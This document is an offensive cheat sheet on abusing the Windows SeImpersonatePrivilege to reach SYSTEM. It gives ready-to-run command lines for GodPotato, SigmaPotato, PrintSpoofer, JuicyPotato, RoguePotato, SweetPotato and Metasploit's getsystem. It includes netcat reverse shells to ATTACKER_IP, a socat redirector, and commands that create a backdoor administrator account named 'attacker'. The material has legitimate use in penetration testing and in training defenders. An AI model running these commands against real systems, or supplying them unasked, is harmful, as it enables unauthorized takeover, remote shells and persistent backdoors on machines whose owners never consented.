`SeImpersonatePrivilege` is a Windows privilege that allows a process to **impersonate the security context of another user after authentication**. This means a process can execute actions using another user’s security token once authentication has occurred.

This privilege is commonly granted to:

- Service accounts
    
- IIS application pools
    
- SQL Server services
    
- Scheduled task services
    

If a low‑privileged user has `SeImpersonatePrivilege`, an attacker can exploit **Windows token impersonation mechanisms** to escalate privileges to **NT AUTHORITY\SYSTEM**.

---

## Checking if SeImpersonatePrivilege is Enabled
Execute:
```
whoami /priv
```

Example output:

```
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
```


---

## Exploitation Methods

### GodPotato (Modern Windows)

`GodPotato` works on many **modern Windows versions**, including:

- Windows Server 2019
    
- Windows Server 2022
    
- Windows 10
    
- Windows 11
    

It abuses **DCOM activation and token impersonation** to obtain a SYSTEM token.

**Execute command as SYSTEM:**

```powershell
GodPotato.exe -cmd "cmd /c whoami"
```

**Spawn interactive shell:**

```powershell
GodPotato.exe -cmd "cmd"
```

**Spawn PowerShell:**

```powershell
GodPotato.exe -cmd "powershell"
```

**Reverse shell example:**

```powershell
GodPotato.exe -cmd "nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### SigmaPotato

`SigmaPotato` is a modern implementation that works reliably on many systems.

**Execute command as SYSTEM:**
```powershell
.\SigmaPotato.exe "cmd /c whoami"
```

**Create user:**

```powershell
.\SigmaPotato.exe "net user attacker Pass123! /add"
```

**Add to administrators:**

```powershell
.\SigmaPotato.exe "net localgroup administrators attacker /add"
```

### PrintSpoofer

Works on many **Windows 10 and Windows Server builds** by abusing the **Print Spooler service**.

**Execute:**

```powershell
PrintSpoofer.exe -i -c cmd
```

**Spawn PowerShell:**

```powershell
PrintSpoofer.exe -i -c powershell
```

### JuicyPotato

Works on **older Windows systems**.

Supported examples:

- Windows Server 2016
    
- Older Windows 10 builds
    

It abuses **COM service activation** using a SYSTEM service CLSID.

**Basic syntax:**

```powershell
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

Example CLSID:

```powershell
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

Reverse shell example:

```powershell
JuicyPotato.exe -l 1337 -p nc.exe -t * -c {CLSID} -a "ATTACKER_IP 4444 -e cmd.exe"
```


### RoguePotato

Used when **JuicyPotato is patched**.

Requires a **redirector on the attacker machine**.

**Attacker machine:**

```powershell
socat tcp-listen:135,fork tcp:TARGET_IP:9999
```

**Target machine:**

```powershell
RoguePotato.exe -r ATTACKER_IP -e cmd.exe -l 9999
```

**Result:**

```powershell
NT AUTHORITY\SYSTEM shell
```


### SweetPotato

SweetPotato integrates several token impersonation techniques.

**Execute command:**

```
SweetPotato.exe -p cmd.exe
```

**Spawn PowerShell:**

```
SweetPotato.exe -p powershell.exe
```

---

## Using Metasploit

Metasploit provides the `getsystem` command to automatically escalate privileges to **NT AUTHORITY\SYSTEM** by abusing token impersonation techniques.

#### Requirements

The current user must have at least one of the following privileges:

- SeImpersonatePrivilege
    
- SeDebugPrivilege
    

Check from a shell:

```bash
meterpreter > shell
whoami /priv
```

#### Execution

From an active Meterpreter session:

```bash
meterpreter > getuid
meterpreter > getsystem
```

#### How It Works

`getsystem` attempts multiple techniques, including:

- Named Pipe Impersonation (PrintSpooler variant)
    
- Token duplication
    
- Other Potato-style impersonation methods
    

It automatically selects the working vector.
If successful, a new security context is obtained:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

